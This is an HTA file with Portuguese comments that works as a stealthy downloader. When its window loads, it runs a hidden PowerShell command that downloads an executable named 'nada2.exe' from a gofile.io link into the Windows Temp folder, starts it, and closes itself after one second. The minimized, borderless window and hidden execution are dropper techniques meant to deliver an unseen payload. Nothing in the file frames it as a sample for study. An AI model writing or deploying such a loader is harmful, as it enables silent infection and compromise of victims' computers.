<!DOCTYPE html>
<html>
<head>
    <title>Download Executor</title>
    <HTA:APPLICATION
        ID="objHTA"
        APPLICATIONNAME="Downloader"
        BORDER="none"
        WINDOWSTATE="minimize">
</head>

<script language="JScript">
    function Window_OnLoad() {
        // Seu link do gofile
        var url = "https://store-na-phx-5.gofile.io/download/web/55e5d047-575b-4d48-92ce-c3806ac0b15b/nada2.exe";
        var filename = "nada2.exe";
        var tempPath = "C:\\Windows\\Temp\\";
        var fullPath = tempPath + filename;
        
        // Comando PowerShell CORRETO (em uma única linha)
        var psCommand = 'powershell.exe -Command "Invoke-WebRequest -Uri \\"' + url + '\\" -OutFile \\"' + fullPath + '\\" -UseBasicParsing; if(Test-Path \\"' + fullPath + '\\"){ Write-Host \\"Download OK em: ' + fullPath + '\\"; Start-Process \\"' + fullPath + '\\" }"';
        
        // Executa o PowerShell em segundo plano
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run(psCommand, 0, false);
        
        // Fecha o HTA após 1 segundo (dá tempo de iniciar)
        setTimeout(function() { window.close(); }, 1000);
    }
</script>

<body></body>
</html>
